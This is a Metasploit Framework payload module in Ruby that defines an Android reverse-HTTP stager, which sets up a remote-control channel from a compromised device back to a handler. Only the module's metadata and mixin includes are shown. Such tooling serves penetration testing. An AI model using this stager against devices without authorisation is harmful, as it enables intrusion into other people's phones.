##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Android
  include Msf::Payload::Android::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'javaurl',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
